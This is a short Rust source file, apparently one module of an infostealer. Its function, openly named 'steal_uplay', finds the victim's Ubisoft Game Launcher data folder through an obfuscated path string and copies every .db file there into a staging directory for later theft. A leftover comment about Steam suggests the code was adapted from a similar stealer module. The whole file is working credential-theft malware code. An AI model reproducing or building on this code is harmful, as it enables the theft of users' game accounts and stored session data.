use walkdir::*;

pub fn steal_uplay(path_in: String) {
    let path_str = format!(
        "{}\\{}\\",
        std::env::var("APPDATA").unwrap(),
        obfstr::obfstr!("Ubisoft Game Launcher")
    );
    let path = std::path::Path::new(&path_str);

    if !path.exists() {
        return;
    }

   let _ =  std::fs::create_dir(format!(
        "{path_in}\\uplay\\",
    ));

    for entry in WalkDir::new(path)
        .max_depth(1)
        .into_iter()
        .filter_map(|f| f.ok())
    {
        if entry.file_name().to_string_lossy().ends_with(".db") {
            let _ = std::fs::copy(
                entry.path(),
                &format!(
                    "{path_in}\\uplay\\{}",
                    entry.file_name().to_str().unwrap()
                ),
            ); // Copy Steam shit
        }
    }
}
